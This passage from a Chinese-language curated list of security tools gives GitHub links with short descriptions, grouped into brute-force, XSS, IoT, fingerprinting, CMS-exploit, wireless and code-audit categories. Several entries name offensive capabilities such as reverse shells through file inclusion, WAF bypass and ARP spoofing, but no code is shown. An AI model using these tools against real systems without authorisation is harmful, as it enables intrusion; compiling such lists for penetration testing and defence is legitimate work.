(暴力破解字典建立工具)</li><li><a href="https://github.com/shengqi158/weak_password_detect" target="_blank" rel="noopener">https://github.com/shengqi158/weak_password_detect</a> (多线程探测弱口令）</li><li><a href="https://github.com/s0md3v/Blazy" target="_blank" rel="noopener">https://github.com/s0md3v/Blazy</a> (支持测试 CSRF, Clickjacking, Cloudflare and WAF的弱口令探测器）</li><li><a href="https://github.com/MooseDojo/myBFF" target="_blank" rel="noopener">https://github.com/MooseDojo/myBFF</a> (对CiscoVPN、Citrix Gateway等各类服务进行弱口令检测的脚本)</li></ul><h4 id="物联网设备识别工具或扫描器"><a href="#物联网设备识别工具或扫描器" class="headerlink" title="物联网设备识别工具或扫描器"></a>物联网设备识别工具或扫描器</h4><ul><li><a href="https://github.com/rapid7/IoTSeeker" target="_blank" rel="noopener">https://github.com/rapid7/IoTSeeker</a> （物联网设备默认密码扫描检测工具)</li><li><a href="https://github.com/shodan-labs/iotdb" target="_blank" rel="noopener">https://github.com/shodan-labs/iotdb</a> (使用nmap扫描IoT设备)</li><li><a href="https://github.com/googleinurl/RouterHunterBR" target="_blank" rel="noopener">https://github.com/googleinurl/RouterHunterBR</a> （路由器设备漏洞扫描利用)</li><li><a href="https://github.com/scu-igroup/telnet-scanner" target="_blank" rel="noopener">https://github.com/scu-igroup/telnet-scanner</a> (Telnet服务密码撞库)</li><li><a href="https://github.com/viraintel/OWASP-Nettacker" target="_blank" rel="noopener">https://github.com/viraintel/OWASP-Nettacker</a> (自动化信息搜集及渗透测试工具，比较适用于IoT扫描)</li><li><a href="https://github.com/threat9/routersploit" target="_blank" rel="noopener">https://github.com/threat9/routersploit</a> (嵌入式设备漏洞扫描及利用工具)</li></ul><h4 id="反射型或DOM-Based-XSS扫描器"><a href="#反射型或DOM-Based-XSS扫描器" class="headerlink" title="反射型或DOM-Based XSS扫描器"></a>反射型或DOM-Based XSS扫描器</h4><ul><li><a href="https://github.com/shawarkhanethicalhacker/BruteXSS" target="_blank" rel="noopener">https://github.com/shawarkhanethicalhacker/BruteXSS</a> （一款XSS扫描器,可暴力注入参数）</li><li><a href="https://github.com/1N3/XSSTracer" target="_blank" rel="noopener">https://github.com/1N3/XSSTracer</a> (小型XSS扫描器,也可检测CRLF、XSS、点击劫持的)</li><li><a href="https://github.com/0x584A/fuzzXssPHP" target="_blank" rel="noopener">https://github.com/0x584A/fuzzXssPHP</a> (PHP版本的反射型xss扫描)</li><li><a href="https://github.com/chuhades/xss_scan" target="_blank" rel="noopener">https://github.com/chuhades/xss_scan</a> (批量扫描XSS的python脚本）</li><li><a href="https://github.com/BlackHole1/autoFindXssAndCsrf" target="_blank" rel="noopener">https://github.com/BlackHole1/autoFindXssAndCsrf</a> (自动化检测页面是否存在XSS和CSRF漏洞的浏览器插件）</li><li><a href="https://github.com/shogunlab/shuriken" target="_blank" rel="noopener">https://github.com/shogunlab/shuriken</a> (使用命令行进行XSS批量检测)</li><li><a href="https://github.com/s0md3v/XSStrike" target="_blank" rel="noopener">https://github.com/s0md3v/XSStrike</a> (可识别并绕过WAF的XSS扫描工具)</li><li><a href="https://github.com/stamparm/DSXS" target="_blank" rel="noopener">https://github.com/stamparm/DSXS</a> (支持GET、POST方式的高效XSS扫描器）</li></ul><h4 id="企业资产管理或信息泄露搜集工具"><a href="#企业资产管理或信息泄露搜集工具" class="headerlink" title="企业资产管理或信息泄露搜集工具"></a>企业资产管理或信息泄露搜集工具</h4><ul><li><a href="https://github.com/ysrc/xunfeng" target="_blank" rel="noopener">https://github.com/ysrc/xunfeng</a> (网络资产识别引擎，漏洞检测引擎）</li><li><a href="https://github.com/laramies/theHarvester" target="_blank" rel="noopener">https://github.com/laramies/theHarvester</a> （企业被搜索引擎收录敏感资产信息监控脚本：员工邮箱、子域名、Hosts）</li><li><a href="https://github.com/x0day/Multisearch-v2" target="_blank" rel="noopener">https://github.com/x0day/Multisearch-v2</a>  (Bing、google、360、zoomeye等搜索引擎聚合搜索，可用于发现企业被搜索引擎收录的敏感资产信息）</li><li><a href="https://github.com/Ekultek/Zeus-Scanner" target="_blank" rel="noopener">https://github.com/Ekultek/Zeus-Scanner</a> (集成化的综合搜索引擎，能够抓取被搜索引擎隐藏的url,并交由sqlmap、nmap扫描）</li><li><a href="https://github.com/0xbug/Biu-framework" target="_blank" rel="noopener">https://github.com/0xbug/Biu-framework</a> (企业内网基础服务安全扫描框架)</li><li><a href="https://github.com/metac0rtex/GitHarvester" target="_blank" rel="noopener">https://github.com/metac0rtex/GitHarvester</a> (github Repo信息搜集工具)</li><li><a href="https://github.com/shengqi158/svnhack" target="_blank" rel="noopener">https://github.com/shengqi158/svnhack</a> （<code>.svn</code>文件夹泄漏利用工具）</li><li><a href="https://github.com/repoog/GitPrey" target="_blank" rel="noopener">https://github.com/repoog/GitPrey</a> (GitHub敏感信息扫描工具)</li><li><a href="https://github.com/0xbug/Hawkeye" target="_blank" rel="noopener">https://github.com/0xbug/Hawkeye</a> (企业资产、敏感信息GitHub泄露监控系统）</li><li><a href="https://github.com/lianfeng30/githubscan" target="_blank" rel="noopener">https://github.com/lianfeng30/githubscan</a> （根据企业关键词进行项目检索以及相应敏感文件和文件内容扫描的工具）</li><li><a href="https://github.com/UnkL4b/GitMiner" target="_blank" rel="noopener">https://github.com/UnkL4b/GitMiner</a> （github敏感信息搜索工具）</li><li><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">https://github.com/lijiejie/GitHack</a> (<code>.git</code>文件夹泄漏利用工具) </li><li><a href="https://github.com/dxa4481/truffleHog" target="_blank" rel="noopener">https://github.com/dxa4481/truffleHog</a> (GitHub敏感信息扫描工具,包括检测commit等)</li><li><a href="https://github.com/1N3/Goohak" target="_blank" rel="noopener">https://github.com/1N3/Goohak</a> （自动化对指定域名进行Google hacking搜索并收集信息）</li><li><a href="https://github.com/UKHomeOffice/repo-security-scanner" target="_blank" rel="noopener">https://github.com/UKHomeOffice/repo-security-scanner</a> (用于搜索git commit中的敏感信息，例如密码、私钥等的客户端工具)</li><li><a href="https://github.com/FeeiCN/GSIL" target="_blank" rel="noopener">https://github.com/FeeiCN/GSIL</a> (Github敏感信息泄露扫描)</li><li><a href="https://github.com/MiSecurity/x-patrol" target="_blank" rel="noopener">https://github.com/MiSecurity/x-patrol</a> (Github泄露巡航工具)</li><li><a href="https://github.com/1N3/BlackWidow" target="_blank" rel="noopener">https://github.com/1N3/BlackWidow</a> (Web站点信息搜集工具，包括邮箱、电话等信息）</li><li><a href="https://github.com/anshumanbh/git-all-secrets" target="_blank" rel="noopener">https://github.com/anshumanbh/git-all-secrets</a> (集合多个开源GitHub敏感信息扫描的企业信息泄露巡航工具)</li><li><a href="https://github.com/s0md3v/Photon" target="_blank" rel="noopener">https://github.com/s0md3v/Photon</a> (可以提取网址，电子邮件，文件，网站帐户等的高速爬虫)</li><li><a href="https://github.com/VKSRC/Github-Monitor" target="_blank" rel="noopener">https://github.com/VKSRC/Github-Monitor</a> (由vipkid SRC开发的Github信息泄漏监控系统)</li></ul><h4 id="webshell检测或木马分析工具"><a href="#webshell检测或木马分析工具" class="headerlink" title="webshell检测或木马分析工具"></a>webshell检测或木马分析工具</h4><ul><li><a href="https://github.com/he1m4n6a/findWebshell" target="_blank" rel="noopener">https://github.com/he1m4n6a/findWebshell</a> （一款简单的webshell检测工具)</li><li><a href="https://github.com/Tencent/HaboMalHunter" target="_blank" rel="noopener">https://github.com/Tencent/HaboMalHunter</a> （哈勃分析系统，linux系统病毒分析及安全检测）</li><li><a href="https://github.com/PlagueScanner/PlagueScanner" target="_blank" rel="noopener">https://github.com/PlagueScanner/PlagueScanner</a> (使用python实现的集成ClamAV、ESET、Bitdefender的反病毒引擎)</li><li><a href="https://github.com/nbs-system/php-malware-finder" target="_blank" rel="noopener">https://github.com/nbs-system/php-malware-finder</a> (一款高效率PHP-webshell扫描工具)</li><li><a href="https://github.com/emposha/PHP-Shell-Detector/" target="_blank" rel="noopener">https://github.com/emposha/PHP-Shell-Detector/</a> (测试效率高达99%的webshell检测工具)</li><li><a href="https://github.com/erevus-cn/scan_webshell" target="_blank" rel="noopener">https://github.com/erevus-cn/scan_webshell</a> (一款简洁的Webshell扫描工具）</li><li><a href="https://github.com/emposha/Shell-Detector" target="_blank" rel="noopener">https://github.com/emposha/Shell-Detector</a> （Webshell扫描工具，支持php/perl/asp/aspx webshell扫描)</li><li><a href="https://github.com/m4rco-/dorothy2" target="_blank" rel="noopener">https://github.com/m4rco-/dorothy2</a> (一款木马、僵尸网络分析框架）</li><li><a href="https://github.com/droidefense/engine" target="_blank" rel="noopener">https://github.com/droidefense/engine</a> (高级安卓木马病毒分析框架）</li></ul><h4 id="内网渗透或扫描工具"><a href="#内网渗透或扫描工具" class="headerlink" title="内网渗透或扫描工具"></a>内网渗透或扫描工具</h4><ul><li><a href="https://github.com/lcatro/network_backdoor_scanner" target="_blank" rel="noopener">https://github.com/lcatro/network_backdoor_scanner</a> （基于网络流量的内网探测框架）</li><li><a href="https://github.com/fdiskyou/hunter" target="_blank" rel="noopener">https://github.com/fdiskyou/hunter</a> （调用 Windows API 枚举用户登录信息）</li><li><a href="https://github.com/BlackHole1/WebRtcXSS" target="_blank" rel="noopener">https://github.com/BlackHole1/WebRtcXSS</a> （自动化利用XSS入侵内网）</li></ul><h4 id="中间件扫描器或指纹识别工具"><a href="#中间件扫描器或指纹识别工具" class="headerlink" title="中间件扫描器或指纹识别工具"></a>中间件扫描器或指纹识别工具</h4><ul><li><a href="https://github.com/ring04h/wyportmap" target="_blank" rel="noopener">https://github.com/ring04h/wyportmap</a> (目标端口扫描+系统服务指纹识别)</li><li><a href="https://github.com/ring04h/weakfilescan" target="_blank" rel="noopener">https://github.com/ring04h/weakfilescan</a> (动态多线程敏感信息泄露检测工具)</li><li><a href="https://github.com/EnableSecurity/wafw00f" target="_blank" rel="noopener">https://github.com/EnableSecurity/wafw00f</a> (WAF产品指纹识别)</li><li><a href="https://github.com/rbsec/sslscan" target="_blank" rel="noopener">https://github.com/rbsec/sslscan</a> （SSL类型识别)</li><li><a href="https://github.com/urbanadventurer/whatweb" target="_blank" rel="noopener">https://github.com/urbanadventurer/whatweb</a> (Web指纹识别)</li><li><a href="https://github.com/tanjiti/FingerPrint" target="_blank" rel="noopener">https://github.com/tanjiti/FingerPrint</a> (Web应用指纹识别)</li><li><a href="https://github.com/nanshihui/Scan-T" target="_blank" rel="noopener">https://github.com/nanshihui/Scan-T</a> （网络爬虫式指纹识别)</li><li><a href="https://github.com/OffensivePython/Nscan" target="_blank" rel="noopener">https://github.com/OffensivePython/Nscan</a> (基于Masscan和Zmap的网络扫描器)</li><li><a href="https://github.com/ywolf/F-NAScan" target="_blank" rel="noopener">https://github.com/ywolf/F-NAScan</a> (网络资产信息扫描, ICMP存活探测,端口扫描，端口指纹服务识别）</li><li><a href="https://github.com/ywolf/F-MiddlewareScan" target="_blank" rel="noopener">https://github.com/ywolf/F-MiddlewareScan</a> （中间件扫描）</li><li><a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a> (web路径收集与扫描)</li><li><a href="https://github.com/x0day/bannerscan" target="_blank" rel="noopener">https://github.com/x0day/bannerscan</a> （C段Banner与路径扫描）</li><li><a href="https://github.com/RASSec/RASscan" target="_blank" rel="noopener">https://github.com/RASSec/RASscan</a> (端口服务扫描)</li><li><a href="https://github.com/3xp10it/bypass_waf" target="_blank" rel="noopener">https://github.com/3xp10it/bypass_waf</a> （waf自动暴破）</li><li><a href="https://github.com/3xp10it/xcdn" target="_blank" rel="noopener">https://github.com/3xp10it/xcdn</a> (尝试找出cdn背后的真实ip)  </li><li><a href="https://github.com/Xyntax/BingC" target="_blank" rel="noopener">https://github.com/Xyntax/BingC</a> （基于Bing搜索引擎的C段/旁站查询，多线程，支持API）</li><li><a href="https://github.com/Xyntax/DirBrute" target="_blank" rel="noopener">https://github.com/Xyntax/DirBrute</a> （多线程WEB目录爆破工具）</li><li><a href="https://github.com/zer0h/httpscan" target="_blank" rel="noopener">https://github.com/zer0h/httpscan</a> （一个爬虫式的网段Web主机发现小工具）</li><li><a href="https://github.com/lietdai/doom" target="_blank" rel="noopener">https://github.com/lietdai/doom</a> （Thorn上实现的分布式任务分发的ip端口漏洞扫描器）</li><li><a href="https://github.com/chichou/grab.js" target="_blank" rel="noopener">https://github.com/chichou/grab.js</a> (类似 zgrab 的快速 TCP 指纹抓取解析工具，支持更多协议)</li><li><a href="https://github.com/Nitr4x/whichCDN" target="_blank" rel="noopener">https://github.com/Nitr4x/whichCDN</a> (CDN识别、检测）</li><li><a href="https://github.com/secfree/bcrpscan" target="_blank" rel="noopener">https://github.com/secfree/bcrpscan</a> (基于爬虫的web路径扫描器)</li><li><a href="https://github.com/mozilla/ssh_scan" target="_blank" rel="noopener">https://github.com/mozilla/ssh_scan</a> (服务器ssh配置信息扫描）</li><li><a href="https://github.com/18F/domain-scan" target="_blank" rel="noopener">https://github.com/18F/domain-scan</a> (针对域名及其子域名的资产数据检测／扫描，包括http/https检测等）</li><li><a href="https://github.com/ggusoft/inforfinder" target="_blank" rel="noopener">https://github.com/ggusoft/inforfinder</a> (域名资产收集及指纹识别工具）</li><li><a href="https://github.com/boy-hack/gwhatweb" target="_blank" rel="noopener">https://github.com/boy-hack/gwhatweb</a> (CMS识别 python gevent实现)</li><li><a href="https://github.com/Mosuan/FileScan" target="_blank" rel="noopener">https://github.com/Mosuan/FileScan</a> (敏感文件扫描 / 二次判断降低误报率 / 扫描内容规则化 / 多目录扫描)</li><li><a href="https://github.com/Xyntax/FileSensor" target="_blank" rel="noopener">https://github.com/Xyntax/FileSensor</a> (基于爬虫的动态敏感文件探测工具)</li><li><a href="https://github.com/deibit/cansina" target="_blank" rel="noopener">https://github.com/deibit/cansina</a> (web路径扫描工具）</li><li><a href="https://github.com/0xbug/Howl" target="_blank" rel="noopener">https://github.com/0xbug/Howl</a> (网络设备 web 服务指纹扫描与检索)</li><li><a href="https://github.com/mozilla/cipherscan" target="_blank" rel="noopener">https://github.com/mozilla/cipherscan</a> (目标主机服务ssl类型识别)</li><li><a href="https://github.com/xmendez/wfuzz" target="_blank" rel="noopener">https://github.com/xmendez/wfuzz</a> (Web应用fuzz工具、框架，同时可用于web路径/服务扫描）</li><li><a href="https://github.com/s0md3v/Breacher" target="_blank" rel="noopener">https://github.com/s0md3v/Breacher</a> (多线程的后台路径扫描器，也可用于发现Execution After Redirect漏洞）</li><li><a href="https://github.com/ztgrace/changeme" target="_blank" rel="noopener">https://github.com/ztgrace/changeme</a> (弱口令扫描器，不仅支持普通登录页，也支持ssh、mongodb等组件）</li><li><a href="https://github.com/medbenali/CyberScan" target="_blank" rel="noopener">https://github.com/medbenali/CyberScan</a> (渗透测试辅助工具，支持分析数据包、解码、端口扫描、IP地址分析等）</li><li><a href="https://github.com/m0nad/HellRaiser" target="_blank" rel="noopener">https://github.com/m0nad/HellRaiser</a> (基于nmap的扫描器，与cve漏洞关联）</li><li><a href="https://github.com/scipag/vulscan" target="_blank" rel="noopener">https://github.com/scipag/vulscan</a> (基于nmap的高级漏洞扫描器，命令行环境使用）</li><li><a href="https://github.com/jekyc/wig" target="_blank" rel="noopener">https://github.com/jekyc/wig</a> (web应用信息搜集工具）</li><li><a href="https://github.com/eldraco/domain_analyzer" target="_blank" rel="noopener">https://github.com/eldraco/domain_analyzer</a> (围绕web服务的域名进行信息收集和”域传送”等漏洞扫描，也支持针对背后的服务器端口扫描等）</li><li><a href="https://github.com/cloudtracer/paskto" target="_blank" rel="noopener">https://github.com/cloudtracer/paskto</a> (基于Nikto扫描规则的被动式路径扫描以及信息爬虫）</li><li><a href="https://github.com/zerokeeper/WebEye" target="_blank" rel="noopener">https://github.com/zerokeeper/WebEye</a> (快速识别WEB服务器类型、CMS类型、WAF类型、WHOIS信息、以及语言框架)</li><li><a href="https://github.com/m3liot/shcheck" target="_blank" rel="noopener">https://github.com/m3liot/shcheck</a> (用于检查web服务的http header的安全性)</li><li><a href="https://github.com/aipengjie/sensitivefilescan" target="_blank" rel="noopener">https://github.com/aipengjie/sensitivefilescan</a> (一款高效快捷的敏感文件扫描工具）</li><li><a href="https://github.com/fnk0c/cangibrina" target="_blank" rel="noopener">https://github.com/fnk0c/cangibrina</a> (通过字典穷举、google、robots.txt等途径的跨平台后台管理路径扫描器）</li><li><a href="https://github.com/n4xh4ck5/CMSsc4n" target="_blank" rel="noopener">https://github.com/n4xh4ck5/CMSsc4n</a> (常规CMS指纹识别）</li><li><a href="https://github.com/Ekultek/WhatWaf" target="_blank" rel="noopener">https://github.com/Ekultek/WhatWaf</a> （WAF指纹识别及自动化bypass工具）</li><li><a href="https://github.com/dzonerzy/goWAPT" target="_blank" rel="noopener">https://github.com/dzonerzy/goWAPT</a> (Web应用fuzz工具、框架，同时可用于web路径/服务扫描)</li><li><a href="https://github.com/blackye/webdirdig" target="_blank" rel="noopener">https://github.com/blackye/webdirdig</a> (web敏感目录/信息泄漏扫描脚本)</li><li><a href="https://github.com/GitHackTools/BillCipher" target="_blank" rel="noopener">https://github.com/GitHackTools/BillCipher</a> (用于网站或IP地址的信息收集工具)</li><li><a href="https://github.com/boy-hack/w8fuckcdn" target="_blank" rel="noopener">https://github.com/boy-hack/w8fuckcdn</a> (通过扫描全网获得真实IP的自动化程序)</li><li><a href="https://github.com/boy-hack/w11scan" target="_blank" rel="noopener">https://github.com/boy-hack/w11scan</a> (分布式WEB指纹识别平台)</li><li><a href="https://github.com/Nekmo/dirhunt" target="_blank" rel="noopener">https://github.com/Nekmo/dirhunt</a> (爬虫式web目录扫描工具)</li><li><a href="https://github.com/MetaChar/pyHAWK" target="_blank" rel="noopener">https://github.com/MetaChar/pyHAWK</a> (数据库文件、私钥等敏感文件泄露扫描)</li></ul><h4 id="专用（即特定性针对某些组件）扫描器"><a href="#专用（即特定性针对某些组件）扫描器" class="headerlink" title="专用（即特定性针对某些组件）扫描器"></a>专用（即特定性针对某些组件）扫描器</h4><ul><li><a href="https://github.com/blackye/Jenkins" target="_blank" rel="noopener">https://github.com/blackye/Jenkins</a> (Jenkins漏洞探测、用户抓取爆破)</li><li><a href="https://github.com/code-scan/dzscan" target="_blank" rel="noopener">https://github.com/code-scan/dzscan</a> (首款集成化的Discuz扫描工具)</li><li><a href="https://github.com/chuhades/CMS-Exploit-Framework" target="_blank" rel="noopener">https://github.com/chuhades/CMS-Exploit-Framework</a> (一款简洁优雅的CMS扫描利用框架)</li><li><a href="https://github.com/lijiejie/IIS_shortname_Scanner" target="_blank" rel="noopener">https://github.com/lijiejie/IIS_shortname_Scanner</a> （IIS短文件名暴力枚举漏洞利用工具)</li><li><a href="https://github.com/riusksk/FlashScanner" target="_blank" rel="noopener">https://github.com/riusksk/FlashScanner</a> (flashxss扫描)</li><li><a href="https://github.com/coffeehb/SSTIF" target="_blank" rel="noopener">https://github.com/coffeehb/SSTIF</a> （一个Fuzzing服务器端模板注入漏洞的半自动化工具）</li><li><a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener">https://github.com/epinna/tplmap</a> (服务器端模板注入漏洞检测与利用工具)</li><li><a href="https://github.com/cr0hn/dockerscan" target="_blank" rel="noopener">https://github.com/cr0hn/dockerscan</a> (Docker扫描工具)</li><li><a href="https://github.com/m4ll0k/WPSeku" target="_blank" rel="noopener">https://github.com/m4ll0k/WPSeku</a> (一款精简的wordpress扫描工具)</li><li><a href="https://github.com/rastating/wordpress-exploit-framework" target="_blank" rel="noopener">https://github.com/rastating/wordpress-exploit-framework</a> (集成化wordpress漏洞利用框架)</li><li><a href="https://github.com/ilmila/J2EEScan" target="_blank" rel="noopener">https://github.com/ilmila/J2EEScan</a> (用于扫描J2EE应用的一款burpsuite插件)</li><li><a href="https://github.com/riusksk/StrutScan" target="_blank" rel="noopener">https://github.com/riusksk/StrutScan</a> (一款基于perl的strut2的历史漏洞扫描器)</li><li><a href="https://github.com/D35m0nd142/LFISuite" target="_blank" rel="noopener">https://github.com/D35m0nd142/LFISuite</a> (本地文件包含漏洞利用及扫描工具，支持反弹shell)</li><li><a href="https://github.com/0x4D31/salt-scanner" target="_blank" rel="noopener">https://github.com/0x4D31/salt-scanner</a> (基于Salt Open以及Vulners Linux Audit API的linux漏洞扫描器，支持与JIRA、slack平台结合使用)</li><li><a href="https://github.com/tijme/angularjs-csti-scanner" target="_blank" rel="noopener">https://github.com/tijme/angularjs-csti-scanner</a> (自动化探测客户端AngularJS模板注入漏洞工具)</li><li><a href="https://github.com/irsdl/IIS-ShortName-Scanner" target="_blank" rel="noopener">https://github.com/irsdl/IIS-ShortName-Scanner</a> (Java编写的IIS短文件名暴力枚举漏洞利用工具)</li><li><a href="https://github.com/swisskyrepo/Wordpresscan" target="_blank" rel="noopener">https://github.com/swisskyrepo/Wordpresscan</a> (基于WPScan以及WPSeku的优化版wordpress扫描器)</li><li><a href="https://github.com/CHYbeta/cmsPoc" target="_blank" rel="noopener">https://github.com/CHYbeta/cmsPoc</a> (CMS渗透测试框架）</li><li><a href="https://github.com/rudSarkar/crlf-injector" target="_blank" rel="noopener">https://github.com/rudSarkar/crlf-injector</a> (CRLF注入漏洞批量扫描）</li><li><a href="https://github.com/3gstudent/Smbtouch-Scanner" target="_blank" rel="noopener">https://github.com/3gstudent/Smbtouch-Scanner</a> (自动化扫描内网中存在的由shadow brokers泄露的ETERNAL系列漏洞)</li><li><a href="https://github.com/utiso/dorkbot" target="_blank" rel="noopener">https://github.com/utiso/dorkbot</a> （通过定制化的谷歌搜索引擎进行漏洞页面搜寻及扫描）</li><li><a href="https://github.com/OsandaMalith/LFiFreak" target="_blank" rel="noopener">https://github.com/OsandaMalith/LFiFreak</a> （本地文件包含漏洞利用及扫描工具，支持反弹shell)</li><li><a href="https://github.com/mak-/parameth" target="_blank" rel="noopener">https://github.com/mak-/parameth</a> (用于枚举脚本的GET/POST未知参数字段）</li><li><a href="https://github.com/Lucifer1993/struts-scan" target="_blank" rel="noopener">https://github.com/Lucifer1993/struts-scan</a> (struts2漏洞全版本检测和利用工具)</li><li><a href="https://github.com/hahwul/a2sv" target="_blank" rel="noopener">https://github.com/hahwul/a2sv</a> (SSL漏洞扫描，例如心脏滴血漏洞等）</li><li><a href="https://github.com/NullArray/DorkNet" target="_blank" rel="noopener">https://github.com/NullArray/DorkNet</a> (基于搜索引擎的漏洞网页搜寻）</li><li><a href="https://github.com/NickstaDB/BaRMIe" target="_blank" rel="noopener">https://github.com/NickstaDB/BaRMIe</a> (用于攻击爆破Java Remote Method Invocation服务的工具)</li><li><a href="https://github.com/RetireJS/grunt-retire" target="_blank" rel="noopener">https://github.com/RetireJS/grunt-retire</a> (扫描js扩展库的常见漏洞）</li><li><a href="https://github.com/kotobukki/BDA" target="_blank" rel="noopener">https://github.com/kotobukki/BDA</a> (针对hadoop/spark等大数据平台的的漏洞探测工具）</li><li><a href="https://github.com/jagracey/Regex-DoS" target="_blank" rel="noopener">https://github.com/jagracey/Regex-DoS</a> (RegEx 拒绝服务扫描器)</li><li><a href="https://github.com/milesrichardson/docker-onion-nmap" target="_blank" rel="noopener">https://github.com/milesrichardson/docker-onion-nmap</a> (使用nmap扫描Tor网络上隐藏的”onion”服务)</li><li><a href="https://github.com/Moham3dRiahi/XAttacker" target="_blank" rel="noopener">https://github.com/Moham3dRiahi/XAttacker</a> (Web CMS Exploit 工具,包含针对主流 CMS 的 66 个不同的 Exploits)</li><li><a href="https://github.com/lijiejie/BBScan" target="_blank" rel="noopener">https://github.com/lijiejie/BBScan</a> (一个迷你的信息泄漏批量扫描脚本)</li><li><a href="https://github.com/almandin/fuxploider" target="_blank" rel="noopener">https://github.com/almandin/fuxploider</a> (文件上传漏洞扫描器及利用工具）</li><li><a href="https://github.com/Ice3man543/SubOver" target="_blank" rel="noopener">https://github.com/Ice3man543/SubOver</a> (子域名接管漏洞检测工具，支持30+云服务托管检测)</li><li><a href="https://github.com/Jamalc0m/wphunter" target="_blank" rel="noopener">https://github.com/Jamalc0m/wphunter</a> (Wordpress漏洞扫描器,同时也支持敏感文件泄露扫描)</li><li><a href="https://github.com/retirejs/retire.js" target="_blank" rel="noopener">https://github.com/retirejs/retire.js</a> (检测网站依赖的JavaScript库中存在的已知通用漏洞)</li><li><a href="https://github.com/3xp10it/xupload" target="_blank" rel="noopener">https://github.com/3xp10it/xupload</a> (自动检测上传功能是否可上传webshell)</li><li><a href="https://github.com/mobrine-mob/M0B-tool" target="_blank" rel="noopener">https://github.com/mobrine-mob/M0B-tool</a> （CMS指纹识别及自动化渗透测试框架）</li><li><a href="https://github.com/rezasp/vbscan" target="_blank" rel="noopener">https://github.com/rezasp/vbscan</a> (论坛框架vBulletin黑盒漏洞扫描器)</li><li><a href="https://github.com/MrSqar-Ye/BadMod" target="_blank" rel="noopener">https://github.com/MrSqar-Ye/BadMod</a> (CMS指纹识别及自动化渗透测试框架)</li><li><a href="https://github.com/Tuhinshubhra/CMSeeK" target="_blank" rel="noopener">https://github.com/Tuhinshubhra/CMSeeK</a> (CMS漏洞检测和利用套件)</li><li><a href="https://github.com/cloudsploit/scans" target="_blank" rel="noopener">https://github.com/cloudsploit/scans</a> (AWS安全审计工具)</li><li><a href="https://github.com/radenvodka/SVScanner" target="_blank" rel="noopener">https://github.com/radenvodka/SVScanner</a> (针对wp、magento、joomla等CMS的漏洞扫描器及自动利用工具)</li><li><a href="https://github.com/rezasp/joomscan" target="_blank" rel="noopener">https://github.com/rezasp/joomscan</a> (OWASP旗下joomla漏洞扫描项目)</li><li><a href="https://github.com/6IX7ine/djangohunter" target="_blank" rel="noopener">https://github.com/6IX7ine/djangohunter</a> (用于检测因错误配置导致敏感信息暴露的Django应用程序)</li></ul><h4 id="无线网络（审计）扫描器"><a href="#无线网络（审计）扫描器" class="headerlink" title="无线网络（审计）扫描器"></a>无线网络（审计）扫描器</h4><ul><li><a href="https://github.com/savio-code/fern-wifi-cracker/" target="_blank" rel="noopener">https://github.com/savio-code/fern-wifi-cracker/</a> (无线安全审计工具)</li><li><a href="https://github.com/m4n3dw0lf/PytheM" target="_blank" rel="noopener">https://github.com/m4n3dw0lf/PytheM</a> （Python网络/渗透测试工具）</li><li><a href="https://github.com/P0cL4bs/WiFi-Pumpkin" target="_blank" rel="noopener">https://github.com/P0cL4bs/WiFi-Pumpkin</a> （无线安全渗透测试套件）</li><li><a href="https://github.com/MisterBianco/BoopSuite" target="_blank" rel="noopener">https://github.com/MisterBianco/BoopSuite</a> (无线网络审计工具，支持2-5GHZ频段）</li><li><a href="https://github.com/DanMcInerney/LANs.py" target="_blank" rel="noopener">https://github.com/DanMcInerney/LANs.py</a> (ARP欺骗，无线网络劫持）</li><li><a href="https://github.com/besimaltnok/PiFinger" target="_blank" rel="noopener">https://github.com/besimaltnok/PiFinger</a> (检查wifi是否是”大菠萝”所开放的热点，并给予网络评分）</li><li><a href="https://github.com/derv82/wifite2" target="_blank" rel="noopener">https://github.com/derv82/wifite2</a> （自动化无线网络攻击工具wifite的重构版本）</li></ul><h4 id="局域网络（本地网络）扫描器"><a href="#局域网络（本地网络）扫描器" class="headerlink" title="局域网络（本地网络）扫描器"></a>局域网络（本地网络）扫描器</h4><ul><li><a href="https://github.com/sowish/LNScan" target="_blank" rel="noopener">https://github.com/sowish/LNScan</a> (基于BBScan via.lijiejie的本地网络扫描)</li><li><a href="https://github.com/niloofarkheirkhah/nili" target="_blank" rel="noopener">https://github.com/niloofarkheirkhah/nili</a> （网络扫描，中间人攻击，协议检测与逆向）</li><li><a href="https://github.com/SkyLined/LocalNetworkScanner" target="_blank" rel="noopener">https://github.com/SkyLined/LocalNetworkScanner</a> （基于javascript的本地网络扫描)</li><li><a href="https://github.com/rootlabs/nWatch" target="_blank" rel="noopener">https://github.com/rootlabs/nWatch</a> (基于网卡ip地址段的本地主机扫描、主机端口扫描、指纹识别)</li></ul><h4 id="代码审计工具或扫描器"><a href="#代码审计工具或扫描器" class="headerlink" title="代码审计工具或扫描器"></a>代码审计工具或扫描器</h4><ul><li><a href="https://github.com/wufeifei/cobra" target="_blank" rel="noopener">https://github.com/wufeifei/cobra</a> (白盒代码安全审计系统)</li><li><a href="https://github.com/OneSourceCat/phpvulhunter" target="_blank" rel="noopener">https://github.com/OneSourceCat/phpvulhunter</a> (静态PHP代码审计)</li><li><a href="https://github.com/Qihoo360/phptrace" target="_blank" rel="noopener">https://github.com/Qihoo360/phptrace</a> (跟踪、分析PHP运行情况的工具）</li><li><a href="https://github.com/ajinabraham/NodeJsScan" target="_blank" rel="noopener">https://github.com/ajinabraham/NodeJsScan</a> (NodeJS应用代码审计）</li><li><a href="https://github.com/shengqi158/pyvulhunter" target="_blank" rel="noopener">https://github.com/shengqi158/pyvulhunter</a> （Python应用审计）</li><li><a href="https://github.com/presidentbeef/brakeman" target="_blank" rel="noopener">https://github.com/presidentbeef/brakeman</a> ( Ruby on Rails应用静态代码分析）</li><li><a href="https://github.com/python-security/pyt" target="_blank" rel="noopener">https://github.com/python-security/pyt</a> (Python应用静态代码审计）</li><li><a href="https://github.com/m4ll0k/WPSploit" target="_blank" rel="noopener">https://github.com/m4ll0k/WPSploit</a> (Wordpress插件代码安全审计）</li><li><a href="https://github.com/emanuil/php-reaper" target="_blank" rel="noopener">https://github.com/emanuil/php-reaper</a> (用于扫描PHP应用程序中可能存在SQL漏洞的ADOdb代码）</li><li><a href="https://github.com/lowjoel/phortress" target="_blank" rel="noopener">https://github.com/lowjoel/phortress</a> (用于检测潜在安全漏洞的PHP静态代码分析工具）</li></ul><h4 id="模块化设计扫描器或漏洞检测框架"><a href="#模块化设计扫描器或漏洞检测框架" class="headerlink" 